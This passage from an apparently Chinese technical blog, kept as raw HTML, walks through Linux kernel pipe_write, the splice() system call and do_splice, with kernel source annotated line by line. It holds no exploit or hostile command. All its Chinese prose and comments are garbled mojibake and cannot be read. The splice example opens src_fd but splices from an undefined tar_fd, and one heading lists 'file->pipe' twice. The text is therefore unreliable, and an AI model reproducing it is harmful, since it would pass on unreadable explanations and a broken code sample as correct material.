*/</span><br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br>pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br><span class="hljs-comment">/* Insert it into the buffer array */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<span class="hljs-comment">//è®¾ç½® buffer çš„ flagï¼Œè‹¥è®¾ç½®äº† O_DIRECT åˆ™ä¸º PACKET</span><br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br><span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += copied;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = copied;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/* Wait for buffer space to become available. */</span><br>        <span class="hljs-comment">//å¦‚æœæ–‡ä»¶æ ‡å¿—ä¸ºéé˜»å¡ï¼Œåˆ™è¿”å›é”™è¯¯ç  -EAGAIN</span><br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>        <span class="hljs-comment">//å¦‚æœå½“å‰è¿›ç¨‹æœ‰ä¿¡å·ç­‰å¾…ï¼Œåˆ™è¿”å›é”™è¯¯ç  -ERESTARTSYS</span><br><span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -ERESTARTSYS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We&#x27;re going to release the pipe lock and wait for more</span><br><span class="hljs-comment"> * space. We wake up any readers if necessary, and then</span><br><span class="hljs-comment"> * after waiting we need to re-check whether the pipe</span><br><span class="hljs-comment"> * become empty while we dropped the lock.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">//é‡Šæ”¾ç®¡é“é”å¹¶ç­‰å¾…ç¼“å†²åŒºç©ºé—´å˜å¾—å¯ç”¨ï¼Œå”¤é†’ä»»ä½•å¯èƒ½æ­£åœ¨ç­‰å¾…è¯»å–çš„è¿›ç¨‹ã€‚å¾…ç­‰å¾…ç»“æŸåï¼Œé‡æ–°è·å–ç®¡é“é”å¹¶é‡æ–°æ£€æŸ¥ç®¡é“æ˜¯å¦ä¸ºç©ºï¼Œä»¥ç¡®å®šæ˜¯å¦éœ€è¦ç»§ç»­æ‰§è¡Œå†™å…¥æ“ä½œã€‚</span><br>__pipe_unlock(pipe);<br><span class="hljs-keyword">if</span> (was_empty) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>&#125;<br>wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br>__pipe_lock(pipe);<br>was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br>wake_next_writer = <span class="hljs-literal">true</span>;<br>&#125;<br>out:<br>    <span class="hljs-comment">//åœ¨å†™å…¥å®Œæˆåï¼Œå¦‚æœä¹‹å‰ç®¡é“å·²æ»¡ï¼Œåˆ™å–æ¶ˆå”¤é†’ä¸‹ä¸€ä¸ªå†™å…¥è€…çš„æ“ä½œ</span><br><span class="hljs-keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))<br>wake_next_writer = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we</span><br><span class="hljs-comment"> * want the reader to start processing things asap, rather than</span><br><span class="hljs-comment"> * leave the data pending.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This is particularly important for small writes, because of</span><br><span class="hljs-comment"> * how (for example) the GNU make jobserver uses small writes to</span><br><span class="hljs-comment"> * wake up pending jobs</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//è§£é”ç®¡é“ï¼Œå¹¶æ ¹æ®æƒ…å†µå”¤é†’ç­‰å¾…çš„è¯»å–è€…æˆ–å†™å…¥è€…</span><br><span class="hljs-keyword">if</span> (was_empty) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>&#125;<br>    <span class="hljs-comment">//å¦‚æœå†™å…¥æˆåŠŸä¸”æˆåŠŸè·å–äº†æ–‡ä»¶ç³»ç»Ÿå†™é”ï¼Œåˆ™æ›´æ–°æ–‡ä»¶çš„è®¿é—®æ—¶é—´</span><br><span class="hljs-keyword">if</span> (wake_next_writer)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;<br><span class="hljs-type">int</span> err = file_update_time(filp);<br><span class="hljs-keyword">if</span> (err)<br>ret = err;<br>sb_end_write(file_inode(filp)-&gt;i_sb);<br>&#125;<br>    <span class="hljs-comment">//è¿”å›å†™å…¥çš„æ€»å­—èŠ‚æ•° ret</span><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä½•ä¸ºsplice"><a href="#ä½•ä¸ºsplice" class="headerlink" title="ä½•ä¸ºsplice"></a>ä½•ä¸ºsplice</h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œæƒ³è¦æŠŠä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®æ‹·è´åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¸¸è§„æ€è·¯ä¾¿æ˜¯æ‰“å¼€æ–‡ä»¶1ï¼Œå¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå†™å…¥æ–‡ä»¶2</p><p>ä½†è¿™æ ·ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´è¦è¿›è¡Œå¤šæ¬¡ç”¨æˆ·æ‹·è´ï¼Œå­˜åœ¨å®¢è§‚çš„å¼€é”€</p><p>æ‰€ä»¥è¿™æ—¶å€™ä¾¿è¦æåˆ°<strong>splice</strong>è¿™ä¸ªç”¨äºåœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ç§»åŠ¨æ•°æ®çš„ç³»ç»Ÿè°ƒç”¨å•¦</p><p><code>splice</code> å‡½æ•°æ˜¯åœ¨ Unix&#x2F;Linux ç³»ç»Ÿä¸­ç”¨äºåœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ç§»åŠ¨æ•°æ®çš„ç³»ç»Ÿè°ƒç”¨ä¹‹ä¸€ã€‚å®ƒé€šå¸¸ç”¨äºä¼˜åŒ–æ•°æ®ä¼ è¾“ï¼Œç‰¹åˆ«æ˜¯åœ¨æ–‡ä»¶å’Œç®¡é“ä¹‹é—´è¿›è¡Œé›¶æ‹·è´ä¼ è¾“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-type">int</span> fd_out, <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br><br>å‚æ•°è¯´æ˜<br>fd_inï¼šè¾“å…¥æ–‡ä»¶æè¿°ç¬¦ï¼Œæ•°æ®å°†ä»è¿™é‡Œè¯»å–ã€‚<br>off_inï¼šè¾“å…¥æ–‡ä»¶çš„åç§»é‡æŒ‡é’ˆï¼Œå¦‚æœä¸º <span class="hljs-literal">NULL</span>ï¼Œåˆ™ä½¿ç”¨å½“å‰æ–‡ä»¶åç§»é‡ã€‚<br>fd_outï¼šè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ•°æ®å°†å†™å…¥åˆ°è¿™é‡Œã€‚<br>off_outï¼šè¾“å‡ºæ–‡ä»¶çš„åç§»é‡æŒ‡é’ˆï¼Œå¦‚æœä¸º <span class="hljs-literal">NULL</span>ï¼Œåˆ™ä½¿ç”¨å½“å‰æ–‡ä»¶åç§»é‡ã€‚<br>lenï¼šè¦ç§»åŠ¨çš„æ•°æ®çš„é•¿åº¦ã€‚<br>flagsï¼šæ ‡å¿—å‚æ•°ï¼Œå¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€æˆ–å®ƒä»¬çš„ç»„åˆï¼š<br>SPLICE_F_MOVEï¼šé»˜è®¤è¡Œä¸ºï¼Œè¡¨ç¤ºå°†æ•°æ®ä»è¾“å…¥æ–‡ä»¶æè¿°ç¬¦ç§»åŠ¨åˆ°è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™æ„å‘³ç€æ•°æ®åœ¨ç§»åŠ¨åä¸å†å­˜åœ¨äºè¾“å…¥æ–‡ä»¶æè¿°ç¬¦ä¸Šã€‚<br>SPLICE_F_NONBLOCKï¼šéé˜»å¡æ¨¡å¼ï¼Œå¦‚æœè®¾ç½®äº†æ­¤æ ‡å¿—ï¼Œå‡½æ•°å°†ä»¥éé˜»å¡æ¨¡å¼è¿è¡Œã€‚<br>SPLICE_F_MOREï¼šæç¤ºå†…æ ¸ç­‰å¾…æ›´å¤šæ•°æ®ï¼Œå¦‚æœè®¾ç½®äº†æ­¤æ ‡å¿—ï¼Œåˆ™å‘Šè¯‰å†…æ ¸è¿˜æœ‰æ›´å¤šæ•°æ®éœ€è¦ç§»åŠ¨ã€‚è¿™å¯èƒ½ä¼šå¢åŠ æ€§èƒ½ã€‚<br>SPLICE_F_GIFTï¼šè¡¨ç¤ºå°†æ•°æ®æ‰€æœ‰æƒç§»åŠ¨åˆ°è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œä¸æ˜¯ä»…ç§»åŠ¨æ•°æ®æœ¬èº«ã€‚<br></code></pre></td></tr></table></figure><p>PSï¼šå°†<code>fd_in</code>ä¼ é€’åˆ°æ–‡ä»¶æè¿°ç¬¦<code>fd_out</code>ï¼Œå…¶ä¸­æ–‡ä»¶æè¿°ç¬¦ä¹‹ä¸€å¿…é¡»å¼•ç”¨ç®¡é“ï¼Œå¯¹äº<code>fd_in</code>æ¥è¯´ï¼Œè‹¥å…¶æ˜¯ä¸€ä¸ªç®¡é“æ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ™<code>off_in</code>å¿…é¡»è¢«è®¾ç½®ä¸º<strong>NULL</strong>ï¼Œè‹¥å®ƒä¸æ˜¯ä¸€ä¸ªç®¡é“æè¿°ç¬¦ï¼Œåˆ™<code>off_in</code>è¡¨ç¤ºä»è¾“å…¥æ•°æ®æµçš„ä½•å¤„å¼€å§‹è¯»å…¥æ•°æ®ï¼Œæ­¤æ—¶ï¼Œå…¶è¢«è®¾ç½®ä¸º<strong>NULL</strong>ï¼Œåˆ™è¯´æ˜ä»è¾“å…¥æ•°æ®çš„å½“å‰åç§»ä½ç½®è¯»å…¥ã€‚å¦åˆ™<code>off_in</code>æŒ‡å‡ºå…·ä½“çš„åç§»ä½ç½®ã€‚ä»¥ä¸Šå¯¹äº<code>fd_out</code>å’Œ<code>off_out</code>åŒæ ·é€‚ç”¨ï¼Œåªä¸è¿‡å…¶ç”¨äºè¾“å‡ºæ•°æ®æµã€‚</p><h3 id="splice-pipe"><a href="#splice-pipe" class="headerlink" title="splice &amp; pipe"></a>splice &amp; pipe</h3><p>é’ˆå¯¹ä¸Šè¿°æƒ…å†µï¼Œæˆ‘ä»¬åªè®¸åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œç„¶åé€šè¿‡ä¸¤æ¬¡<code>splice</code>ä¾¿èƒ½å®Œæˆä¸¤ä¸ªæ–‡ä»¶é—´çš„æ•°æ®æ‹·è´</p><p>å¤§æ¦‚æ ·ä¾‹å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br>pipe(pipe_fd);<br>src_fd = open(<span class="hljs-string">&quot;source_file&quot;</span>, O_RDWR);<br>splice(tar_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br><br>dest_fd = open(<span class="hljs-string">&quot;dest_file&quot;</span>, O_RDWR);<br>splice(pipe_fd[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, dest_fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, SPLICE_F_MOVE);<br>......<br></code></pre></td></tr></table></figure><p>æ— éœ€è¿›è¡Œå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´çš„æ‹·è´ï¼Œç›´æ¥åœ¨å†…æ ¸å®Œæˆä¸€æ¡é¾™æœåŠ¡</p><h3 id="do-splice"><a href="#do-splice" class="headerlink" title="do_splice"></a>do_splice</h3><p>æ ¹æ®ç®¡é“-&gt;ç®¡é“ã€æ–‡ä»¶-&gt;ç®¡é“ã€æ–‡ä»¶-&gt;ç®¡é“ï¼Œåˆ†ä¸ºä¸‰ä¸ªåˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Determine where to splice to/from.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">do_splice</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *in, <span class="hljs-type">loff_t</span> __user *off_in,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> file *out, <span class="hljs-type">loff_t</span> __user *off_out,</span><br><span class="hljs-params"><span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br><span class="hljs-type">loff_t</span> offset;<br><span class="hljs-type">long</span> ret;<br><br>    <span class="hljs-comment">//é€šè¿‡æ£€æŸ¥è¾“å…¥å’Œè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦çš„æ¨¡å¼ï¼ˆmodeï¼‰æ¥ç¡®ä¿å®ƒä»¬æ˜¯å¯è¯»å’Œå¯å†™çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªä¸ç¬¦åˆè¦æ±‚ï¼Œåˆ™è¿”å›é”™è¯¯ç -EBADFï¼Œè¡¨ç¤ºæ— æ•ˆçš„æ–‡ä»¶æè¿°ç¬¦ã€‚</span><br><span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||<br>     !(out-&gt;f_mode &amp; FMODE_WRITE)))<br><span class="hljs-keyword">return</span> -EBADF;<br>    <br><span class="hljs-comment">//ä½¿ç”¨get_pipe_info()å‡½æ•°è·å–è¾“å…¥å’Œè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦å¯¹åº”çš„ç®¡é“ä¿¡æ¯</span><br>ipipe = get_pipe_info(in, <span class="hljs-literal">true</span>);<br>opipe = get_pipe_info(out, <span class="hljs-literal">true</span>);<br>    <br><span class="hljs-comment">//å¦‚æœä¸¤è€…éƒ½æ˜¯ç®¡é“ï¼Œåˆ™è¿›è¡Œç®¡é“åˆ°ç®¡é“çš„spliceæ“ä½œ</span><br><span class="hljs-keyword">if</span> (ipipe &amp;&amp; opipe) &#123;<br>        <span class="hljs-comment">//å°è¯•åœ¨ç®¡é“ä¸Šæ‰§è¡Œå…·æœ‰æŒ‡å®šåç§»é‡çš„æ“ä½œï¼Œè¿™åœ¨ç®¡é“æ“ä½œä¸­æ˜¯ä¸è¢«å…è®¸çš„</span><br><span class="hljs-keyword">if</span> (off_in || off_out)<br><span class="hljs-keyword">return</span> -ESPIPE;<br><br><span class="hljs-comment">/* Splicing to self would be fun, but... */</span><br>        <span class="hljs-comment">//æ£€æŸ¥è¾“å…¥ç®¡é“å’Œè¾“å‡ºç®¡é“æ˜¯å¦ç›¸åŒã€‚å¦‚æœå®ƒä»¬ç›¸åŒï¼Œè¡¨ç¤ºå°è¯•å°†æ•°æ®ä»ç®¡é“æ‹·è´åˆ°è‡ªèº«ï¼Œè¿™æ˜¯æ²¡æœ‰æ„ä¹‰çš„æ“ä½œ</span><br><span class="hljs-keyword">if</span> (ipipe == opipe)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>         <span class="hljs-comment">//æ£€æŸ¥è¾“å…¥æ–‡ä»¶å’Œè¾“å‡ºæ–‡ä»¶çš„æ ‡å¿—ï¼Œå¦‚æœå…¶ä¸­ä»»ä½•ä¸€ä¸ªè®¾ç½®äº†O_NONBLOCKæ ‡å¿—ï¼Œåˆ™å°†SPLICE_F_NONBLOCKæ ‡å¿—æ·»åŠ åˆ°flagsä¸­</span><br><span class="hljs-keyword">if</span> ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)<br>flags |= SPLICE_F_NONBLOCK;<br><br><span class="hljs-keyword">return</span> splice_pipe_to_pipe(ipipe, opipe, len, flags);<br>&#125;<br><br>    <span class="hljs-comment">//å¦‚æœåªæœ‰è¾“å…¥æ–‡ä»¶æè¿°ç¬¦æ˜¯ç®¡é“ï¼Œåˆ™æ‰§è¡Œä»ç®¡é“åˆ°æ–‡ä»¶çš„spliceæ“ä½œ</span><br><span class="hljs-keyword">if</span> (ipipe) &#123;<br>        <span class="hljs-comment">//åœ¨ä»ç®¡é“ä¸­è¯»å–æ•°æ®æ—¶ï¼Œä¸å…è®¸æŒ‡å®šåç§»é‡</span><br><span class="hljs-keyword">if</span> (off_in)<br><span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-keyword">if</span> (off_out) &#123;<br><span class="hljs-keyword">if</span> (!(out-&gt;f_mode &amp; FMODE_PWRITE))<span class="hljs-comment">//å…ˆæ£€æŸ¥è¾“å‡ºæ–‡ä»¶æ˜¯å¦æ”¯æŒå†™å…¥æ“ä½œï¼ˆå³æ˜¯å¦æ”¯æŒPWRITEæ¨¡å¼ï¼‰</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_out, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//ä»ç”¨æˆ·ç©ºé—´æ‹·è´è¾“å‡ºåç§»é‡åˆ°å†…æ ¸ç©ºé—´çš„offsetå˜é‡ä¸­</span><br><span class="hljs-keyword">return</span> -EFAULT;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>offset = out-&gt;f_pos;<span class="hljs-comment">//æ²¡æœ‰æŒ‡å®šè¾“å‡ºåç§»é‡ï¼Œåˆ™å°†è¾“å‡ºåç§»é‡è®¾ç½®ä¸ºè¾“å‡ºæ–‡ä»¶å½“å‰çš„ä½ç½®</span><br>&#125;<br><br>        <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†O_APPENDæ ‡å¿—ï¼Œå¦‚æœè®¾ç½®äº†ï¼Œè¡¨ç¤ºåœ¨è¾“å‡ºæ–‡ä»¶æœ«å°¾è¿½åŠ æ•°æ®ï¼Œè¿™æ˜¯ä¸å…è®¸çš„</span><br><span class="hljs-keyword">if</span> (unlikely(out-&gt;f_flags &amp; O_APPEND))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>        <span class="hljs-comment">//éªŒè¯å†™å…¥æ“ä½œçš„æœ‰æ•ˆæ€§ï¼ŒåŒ…æ‹¬æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯å†™ä»¥åŠå†™å…¥ä½ç½®æ˜¯å¦æœ‰æ•ˆã€‚</span><br>ret = rw_verify_area(WRITE, out, &amp;offset, len);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-comment">//ç„¶åæ£€æŸ¥è¾“å…¥æ–‡ä»¶æ˜¯å¦è®¾ç½®äº†O_NONBLOCKæ ‡å¿—ï¼Œå¦‚æœè®¾ç½®äº†ï¼Œåˆ™å°†SPLICE_F_NONBLOCKæ ‡å¿—æ·»åŠ åˆ°flagsä¸­ï¼Œè¡¨ç¤ºæ‰§è¡Œéé˜»å¡çš„spliceæ“ä½œ</span><br><span class="hljs-keyword">if</span> (in-&gt;f_flags &amp; O_NONBLOCK)<br>flags |= SPLICE_F_NONBLOCK;<br>        <br><span class="hljs-comment">//è°ƒç”¨file_start_write()å‡½æ•°é€šçŸ¥æ–‡ä»¶ç³»ç»Ÿå¼€å§‹å†™å…¥æ“ä½œ</span><br>file_start_write(out);<br>ret = do_splice_from(ipipe, out, &amp;offset, len, flags);<span class="hljs-comment">//ç”±do_splice_from()å‡½æ•°å®Œæˆä»ç®¡é“åˆ°æ–‡ä»¶çš„æ•°æ®ä¼ è¾“</span><br>file_end_write(out);<span class="hljs-comment">//è°ƒç”¨file_end_write()å‡½æ•°é€šçŸ¥æ–‡ä»¶ç³»ç»Ÿå†™å…¥æ“ä½œå·²ç»å®Œæˆã€‚</span><br><br>        <span class="hljs-comment">//å¦‚æœæ²¡æœ‰æŒ‡å®šè¾“å‡ºåç§»é‡ï¼Œåˆ™æ›´æ–°è¾“å‡ºæ–‡ä»¶çš„ä½ç½®ä¸ºå†™å…¥æ•°æ®åçš„ä½ç½®ã€‚</span><br><span class="hljs-keyword">if</span> (!off_out)<br>out-&gt;f_pos = offset;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (copy_to_user(off_out, &amp;offset, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<br>ret = -EFAULT;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><span class="hljs-comment">//å¦‚æœåªæœ‰è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦æ˜¯ç®¡é“ï¼Œåˆ™æ‰§è¡Œä»æ–‡ä»¶åˆ°ç®¡é“çš„spliceæ“ä½œ</span><br><span class="hljs-keyword">if</span> (opipe) &#123;<br><span class="hljs-keyword">if</span> (off_out)<span class="hljs-comment">//å‘ç®¡é“ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œä¸å…è®¸æŒ‡å®šåç§»é‡</span><br><span class="hljs-keyword">return</span> -ESPIPE;<br><span class="hljs-keyword">if</span> (off_in) &#123;<br><span class="hljs-keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))<span class="hljs-comment">//å…ˆæ£€æŸ¥è¾“å…¥æ–‡ä»¶æ˜¯å¦æ”¯æŒè¯»å–æ“ä½œï¼ˆå³æ˜¯å¦æ”¯æŒPREADæ¨¡å¼ï¼‰</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">loff_t</span>)))<span class="hljs-comment">//ä»ç”¨æˆ·ç©ºé—´æ‹·è´è¾“å…¥åç§»é‡åˆ°å†…æ ¸ç©ºé—´çš„offsetå˜é‡ä¸­</span><br><span class="hljs-keyword">return</span> -EFAULT;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>offset = in-&gt;f_pos;<span class="hljs-comment">//æ²¡æœ‰æŒ‡å®šè¾“å…¥åç§»é‡ï¼Œåˆ™å°†è¾“å…¥åç§»é‡è®¾ç½®ä¸ºè¾“å…¥æ–‡ä»¶å½“å‰çš„ä½ç½®</span><br>&#125;<br>        <br><span class="hljs-comment">//å¦‚æœè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦è®¾ç½®äº†éé˜»å¡æ ‡å¿—ï¼ˆO_NONBLOCKï¼‰ï¼Œåˆ™è®¾ç½®ç›¸åº”çš„æ ‡å¿—ä½</span><br><span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br>flags |= SPLICE_F_NONBLOCK;<br>        <br><span class="hljs-comment">//è·å–ç®¡é“çš„é”ï¼Œä»¥ç¡®ä¿å¹¶å‘æƒ…å†µä¸‹ç®¡é“çš„æ“ä½œä¸ä¼šå†²çª</span><br>pipe_lock(opipe);<br>        <br>        <span 